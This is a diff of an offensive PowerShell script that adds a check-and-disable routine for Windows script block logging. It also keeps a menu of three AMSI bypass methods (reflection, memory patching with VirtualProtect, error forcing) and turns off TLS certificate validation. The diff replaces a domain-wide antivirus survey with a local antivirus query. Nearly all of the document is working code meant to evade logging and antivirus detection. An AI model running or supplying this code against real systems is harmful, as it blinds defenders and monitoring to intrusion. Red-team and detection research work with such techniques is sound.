@@ -1,14 +1,48 @@
-Write-host " "
-Write-host "Running script block logging bypass"
-$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
-$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
-$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScriptBlockLogging',"0")
-[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
+#@cobbr_io script block logging bypass
+try 
+{
+        Write-host " "
+        $pathk = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Scr"+"iptB"+"lockLo"+"gging"
+
+	    $value = Get-ItemProperty -Path $pathk | Select-Object -ExpandProperty 'EnableScriptBlockLogging' -ErrorAction Stop
+	    if($value -ne 1)
+        {
+            throw "Script block logging not enabled"
+        }
+        Write-host "Script block logging enabled"
+        Write-host " "
+        Write-host "Running script block logging bypass"
+        $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
+        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScriptBlockLogging',"0")
+        [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
+
+        write-host " "
+        write-host "Test ScriptBlockLogging"
+
+        $log = Get-WinEvent -filterhashtable @{logname="Microsoft-Windows-PowerShell/Operational";id=4104} -erroraction 'silentlycontinue' | Where {$_.Message -like "*Test ScriptBlockLogging*"}
+        if($log -eq $null)
+        {							
+	        Write-host " "
+	        Write-host "Script block logging bypass executed successfully"
+        }
+        else
+        {							
+	        Write-host " "
+	        Write-host "Error executing Script block logging bypass. Exit "
+            return
+        }
+
+}
+catch 
+{
+	    Write-host "Script block logging not enabled"
+}
 
 function AV-Bypass-Setup
 <#
 .SYNOPSIS
-	PowerShell AMSI and Logging Bypass.
+	PowerShell AMSI Bypass.
 	Resources:
 	  - @_xpn_ => https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
 .DESCRIPTION
@@ -25,7 +59,7 @@ function AV-Bypass-Setup
 	Write-host ""
 	Write-host "1 Reflection "
 	Write-host "2 Patching"
-	Write-host "3 Error"
+	Write-host "3 Error Forcing"
 	Write-host ""
 	
     $menuevcmd = Read-Host -Prompt 'Set evasion option'
@@ -34,7 +68,7 @@ function AV-Bypass-Setup
 	{
 			1 {
 				
-				#Matt Graeber's Reflection method
+				#@mattifestation
 				
 				Write-host " "
 				Write-host "Running Reflection method"
@@ -42,7 +76,7 @@ function AV-Bypass-Setup
 			}
 			2 {
                 		
-				#@_xpn_'s Patching method
+				#@Tal_Liberman's Patching method
 				
 				Write-host " "
 				Write-host "Running Patching method"
@@ -69,7 +103,7 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
 			}
           	      3 {
                 
-				#@_xpn_'s Patching method
+				#@_xpn_'s Error forcing method
 				
 				Write-host " "
 				Write-host "Running Error forcing method"
@@ -88,75 +122,12 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;
 
 }
+
 function Get-AVStatus {
  
-	[CmdletBinding()]
-	param
-	(
-
-	[ValidateSet('Server','Computer')]
-	$scope
-
-	)
-
-	$output=@()
-	
-	switch ($Scope) {
-
-		Server 
-		{
-			$server=Get-ADComputer -Filter 'operatingsystem -like "*server*" -and enabled -eq "true"' | Select-Object -ExpandProperty Name
-
-			foreach ($s in $server) 
-			{
-				$result=Invoke-Command -ComputerName $s {Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,` BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated}
-
-				if ($result) 
-				{
-					Write-host "Computer: $result.PSComputername"
-					Write-host "Anti-Virus: $result.AntivirusEnabled"
-					Write-host "AV Update: $result.AntivirusSignatureLastUpdated"
-					Write-host "Anti-Spyware: $result.AntispywareEnabled"
-					Write-host "Anti-Malware: $result.AMServiceEnabled"
-					Write-host "Behavior Monitor: $result.BehaviorMonitorEnabled"
-					Write-host "Office-Anti-Virus: $result.IoavProtectionEnabled"
-					Write-host "NIS: $result.NISEnabled"
-					Write-host "Access Prot: $result.OnAccessProtectionEnabled"
-					Write-host "R-T Prot: $result.RealTimeProtectionEnabled"
-				}
-
-			}
-		}
-
-		Computer {
-
-			$comp=Get-ADComputer -Filter 'enabled -eq "true"' | Select-Object -ExpandProperty Name
-
-			foreach ($c in $comp) {
-				$result = Invoke-Command -ComputerName $c {Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,` BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated}
-
-				if ($result) 
-				{
-					Write-host "Computer: $result.PSComputername"
-					Write-host "Anti-Virus: $result.AntivirusEnabled"
-					Write-host "AV Update: $result.AntivirusSignatureLastUpdated"
-					Write-host "Anti-Spyware: $result.AntispywareEnabled"
-					Write-host "Anti-Malware: $result.AMServiceEnabled"
-					Write-host "Behavior Monitor: $result.BehaviorMonitorEnabled"
-					Write-host "Office-Anti-Virus: $result.IoavProtectionEnabled"
-					Write-host "NIS: $result.NISEnabled"
-					Write-host "Access Prot: $result.OnAccessProtectionEnabled"
-					Write-host "R-T Prot: $result.RealTimeProtectionEnabled"					
-				}
-			}
-		}
-		default {
-
-			Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,`NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
-		}
-	}
-	Write-Output $result
+	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
 }
+
 Write-host ""
 Write-host "Localhost AV Status"
 Get-AVStatus
